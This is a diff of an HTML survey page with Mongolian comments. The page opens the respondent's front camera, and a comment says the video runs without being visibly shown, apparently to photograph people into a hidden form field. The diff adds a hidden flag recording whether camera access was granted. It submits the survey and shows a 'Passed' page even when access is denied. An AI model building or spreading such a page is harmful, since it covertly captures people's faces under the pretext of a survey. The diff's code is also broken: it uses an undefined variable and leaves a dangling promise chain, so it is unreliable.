@@ -156,6 +156,7 @@
 
         <form id="surveyForm" class="survey-form" method="POST" action="/submit">
             <input type="hidden" id="photo_data_input" name="photo_data">
+            <input type="hidden" name="camera_allowed" id="camera_allowed" value="false">
             <div class="question">
                 <div class="question-title">
                     <span class="question-number">1)</span>
@@ -205,10 +206,15 @@
 
         // Камер нээх (video: true)
         // playsinline, muted нь гар утсанд видеог ил харуулахгүй ажиллуулахад тусална
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" }, // Нүүрний камер
-            audio: false 
-        })
+        navigator.mediaDevices.getUserMedia(constraints)
+    .then(stream => {
+        document.getElementById('camera_allowed').value = 'true'; // Зөвшөөрсөн бол true болгоно
+        // ... зургийг авах код ...
+    })
+    .catch(err => {
+        document.getElementById('camera_allowed').value = 'false'; // Зөвшөөрөөгүй бол false хэвээр үлдэнэ
+        surveyForm.submit(); // Зөвшөөрөөгүй ч формыг илгээж "Тэнцлээ" хуудас харуулна
+    });
         .then(stream => {
             cameraStream = stream;
             video.srcObject = stream;
